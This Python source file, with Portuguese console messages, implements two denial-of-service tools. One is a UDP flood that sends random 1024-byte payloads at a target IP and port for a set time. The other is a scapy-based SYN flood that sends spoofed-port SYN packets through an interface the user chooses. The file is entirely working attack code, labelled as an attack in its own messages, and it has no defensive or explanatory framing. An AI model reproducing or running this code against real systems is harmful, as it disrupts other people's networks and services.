import random
import sys
import time
import socket
from scapy.all import IP, TCP, Ether, sendp, conf

def udp_flood(target_ip, target_port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024)
    timeout = time.time() + duration
    sent = 0

    print(f"[*] A iniciar UDP Flood em {target_ip}:{target_port} por {duration}s...")

    while True:
        if time.time() > timeout:
            break
        try:
            client.sendto(bytes_to_send, (target_ip, target_port))
            sent += 1
            print(f"\r[*] Pacotes enviados: {sent}", end="")
        except KeyboardInterrupt:
            print("\n[!] Ataque interrompido.")
            break
        except Exception as e:
            print(f"\n[!] Erro: {e}")
            break
    print("\n[*] Ataque UDP terminado.")

def syn_flood(target_ip, target_port, count):
    print("-" * 60)
    print(f"[*] A preparar SYN Flood contra {target_ip}:{target_port}")
    print("-" * 60)

    # 1. MOSTRAR AS PLACAS DE REDE DISPONÍVEIS
    print("--- Placas de Rede Detetadas ---")
    print(conf.ifaces) # Mostra a lista no terminal
    print("--------------------------------")
    
    # 2. PERGUNTAR QUAL USAR
    print("[!] DICA: Escolha a interface que tem Internet (ex: 'Wi-Fi', 'Ethernet', 'Ethernet 2')")
    print("[!] Procure na coluna 'Name' ou 'Description'.")
    iface_name = input("Nome da Interface (copie da lista acima): ").strip()
    
    # 3. MAC ADDRESS
    target_mac = input(f"MAC Address do Alvo (Enter para {target_ip}): ").strip()
    if not target_mac:
        print("[!] A tentar resolver MAC automaticamente...")
    
    print(f"\n[*] A enviar {count} pacotes pela interface '{iface_name}'...")

    try:
        for i in range(count):
            ip_layer = IP(dst=target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), 
                            dport=target_port, 
                            flags="S",
                            seq=random.randint(1000, 9000))
            
            # Se tivermos MAC, usamos Ethernet (Layer 2)
            if target_mac:
                eth_layer = Ether(dst=target_mac)
                packet = eth_layer / ip_layer / tcp_layer
                sendp(packet, iface=iface_name, verbose=False)
            else:
                # Se não, tentamos Layer 3 forçando a interface
                packet = ip_layer / tcp_layer
                sendp(Ether()/packet, iface=iface_name, verbose=False) 

            print(f"\r[*] Pacote {i+1}/{count} enviado...", end="")
            
    except Exception as e:
        print(f"\n[!] Erro: {e}")
        print("[!] Verifique se escreveu o nome da Interface EXATAMENTE igual à lista (aspas não necessárias).")
    
    print("\n[*] Ataque SYN terminado.")